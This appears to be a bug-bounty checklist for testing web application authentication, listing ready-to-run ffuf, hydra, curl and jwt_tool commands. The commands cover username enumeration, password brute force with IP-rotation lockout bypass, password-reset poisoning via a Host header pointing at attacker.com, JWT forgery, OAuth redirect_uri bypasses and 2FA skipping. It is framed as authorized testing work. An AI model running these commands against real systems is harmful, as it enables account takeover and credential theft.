mandatory feature mapping — do this before any exploitation
List every single feature of the applicationCritical
Registration, login, SSO, profile, password reset, upload, payment, messaging, export, import, admin, API keys, webhooks, invitations, org management, 2FA, reports...
Create features.txt — every unchecked feature is a potential untested bug
Map every user role and what each can do vs cannot doHigh Value
Admin, staff, org-owner, member, guest, API user — every role boundary is a privilege escalation test surface.
Build role matrix: rows=actions, columns=roles — mark allowed/denied. Every "denied" cell = test target.
Identify all object types — every object = IDOR surfaceHigh Value
Orders, invoices, messages, documents, reports, tickets, projects, comments, attachments — list them all with their ID format.
Rank features by impact if broken — start at top
Payment flow, auth, admin actions, user data export = HIGHEST. Profile picture = LOWEST. Prioritize ruthlessly.
Create 3 test accounts — User A (attacker), User B (victim), Admin if possibleCritical
NEVER test IDOR or auth without two accounts. NEVER access real user data. Always use accounts you control.
Always request elevated test accounts in your program introduction message — most programs provide them
burp suite setup — configure before touching the app
Lock Burp scope to target domain only — no noise
Burp → Target → Scope → Add target.com wildcard. Uncheck "Use advanced scope control" for simplicity.
Install and configure Autorize extension — automatic IDOR/auth testingCritical
Paste User A session cookie in Autorize config. Browse as User B. Every IDOR flagged automatically.
Burp BApp Store → Autorize — must-have for systematic authorization testing
Install Param Miner, Logger++, JS Miner, Active Scan++
Param Miner: discovers hidden headers/params passively. Logger++: advanced filtering. JS Miner: auto-extracts endpoints from every JS file as you browse.
Browse the ENTIRE app as a normal user first — click everythingHigh Value

▼
login & account enumeration
Username enumeration via response differences (body, timing, status)High Value
ffuf -u https://target.com/api/login -X POST -d '{"email":"FUZZ","password":"x"}' -H "Content-Type: application/json" -w usernames.txt -mc all -o user-enum.json -t 5
Compare: response time differences (>100ms = user exists), body length, error message wording.
Account lockout bypass — X-Forwarded-For IP rotation per requestOften Missed
ffuf -u https://target.com/login -X POST -d "email=victim@target.com&password=FUZZ" -w rockyou.txt -H "X-Forwarded-For: §RANDOM§" -t 5 -o lockout-bypass.txt
Also try: X-Real-IP, X-Client-IP, True-Client-IP, Forwarded headers to bypass per-IP lockout
Test default credentials on all admin panels and exposed servicesQuick Win
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv https-post-form "target.com:/login:user=^USER^&pass=^PASS^:F=invalid"
Try manually: admin/admin, admin/password, admin/target123, root/root — hits more often than expected.
password reset
Password reset token entropy analysis — collect 20+ tokens and compareHigh Value
for i in $(seq 1 20); do curl -s -X POST https://target.com/reset -d "email=test$i@mailinator.com" && sleep 1; done # Then collect and analyze tokens from email
Sequential or low-entropy tokens can be predicted. MD5(email) or MD5(timestamp) are common weak patterns.
Host header injection for password reset poisoningCritical
curl -s -X POST https://target.com/reset -d "email=victim@target.com" -H "Host: attacker.com" -H "X-Forwarded-Host: attacker.com"
If reset link uses Host header to build URL → link sent to victim points to attacker.com → token stolen.
Also try: X-Original-Host, X-Forwarded-Server — use Burp Collaborator as attacker.com
Password reset token — test expiry, reuse after use, no invalidation on new requestOften Missed
1) Get reset token 2) Use it 3) Try reusing it again. Also: generate new token, old one should be invalid.
jwt & session
JWT: alg:none attack, RS256→HS256 confusion, weak secret brute-forceCritical
python3 jwt_tool.py TARGET_JWT -X a && python3 jwt_tool.py TARGET_JWT -X k -pk server.pub && python3 jwt_tool.py TARGET_JWT -C -d /usr/share/seclists/Passwords/Common-Credentials/rockyou.txt
jwt_tool: pip install jwt-tool — -X a = alg:none, -X k = key confusion, -C -d = crack secret
JWT claim tampering — change role:user to role:admin, add isAdmin:trueCritical
python3 jwt_tool.py TARGET_JWT -T # Tamper mode — modify any claim, re-sign with discovered secret
Session fixation and invalidation — does session change after login? Invalidate on logout?Often Missed
python3 -c "import requests; s=requests.Session(); pre=s.get('https://target.com').cookies; s.post('https://target.com/login',data={'u':'user','p':'pass'}); post=s.cookies; print('SAME' if pre==post else 'OK - changed')"
Session must change on login. Old session token must be invalid after logout.
oauth & sso
OAuth flow — missing state parameter, CSRF on authorization endpointCritical
curl -sk "https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com&response_type=code" # No state = CSRF attack possible
OAuth redirect_uri validation bypass — open redirect to steal auth codeCritical
Test: redirect_uri=https://target.com.evil.com, redirect_uri=https://evil.com%2F@target.com, redirect_uri=https://target.com/callback/../../../evil
Open redirect + OAuth = account takeover. Chain: RXSS → steal code → full ATO.
OAuth token leakage in Referer header — implicit flowOften Missed
In implicit flow (response_type=token), access token appears in URL fragment. If page loads external resource, token leaks in Referer header.
Check for response_type=token — then look for external script/img loads on callback page

2FA bypass — skip step entirely by directly requesting post-2FA endpointHigh Value
curl -s https://target.com/dashboard -H "Cookie: session=VALID_SESSION_BEFORE_2FA" # Does it redirect or serve dashboard?
2FA code reuse — already used code should be invalidOften Missed
curl -s -X POST https://target.com/verify-otp -d '{"code":"123456"}' -H "Cookie: session=TOKEN" # Then repeat same request
